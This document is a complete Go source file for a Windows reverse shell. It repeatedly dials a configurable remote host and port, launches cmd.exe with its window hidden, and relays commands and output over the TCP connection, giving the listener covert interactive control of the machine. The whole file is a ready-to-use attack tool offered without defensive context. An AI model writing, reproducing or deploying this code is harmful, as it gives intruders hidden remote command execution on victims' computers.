package main

import (
	"bufio"
	"net"
	"os/exec"
	"strings"
	"syscall"
	"time"
)

const (
	RHOST = "192.168.0.1" // your ip
	RPORT = "4444"        // your port
)

func main() {
	conn := ConnectToListener()
	defer conn.Close()
	InteractiveShell(conn)
}

// connect to the listener, once a connection has been established return the object
func ConnectToListener() net.Conn {
	for {
		conn, err := net.Dial("tcp", RHOST+":"+RPORT)
		if err == nil {
			return conn
		}
		time.Sleep(100 * time.Second)
	}
}

// interactive shell allows the listener to continously send commands
func InteractiveShell(conn net.Conn) {
	for {
		cmd := exec.Command("cmd.exe")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		stdoutPipe, _ := cmd.StdoutPipe()
		defer stdoutPipe.Close()
		stderrPipe, _ := cmd.StderrPipe()
		defer stderrPipe.Close()
		stdinPipe, _ := cmd.StdinPipe()
		cmd.Start()
		go func() {
			scanner := bufio.NewScanner(stdoutPipe)
			for scanner.Scan() {
				output := scanner.Text()
				conn.Write([]byte(output + "\n"))
			}
		}()
		scanner := bufio.NewScanner(conn)
		for scanner.Scan() {
			input := scanner.Text()
			if input == "exit" {
				stdinPipe.Write([]byte("exit\r\n"))
				break
			}
			stdinPipe.Write([]byte(input + "\r\n"))
		}
		cmd.Wait()
		// break if user types exit
		if strings.TrimSpace(scanner.Text()) == "exit" {
			break
		}
	}
}
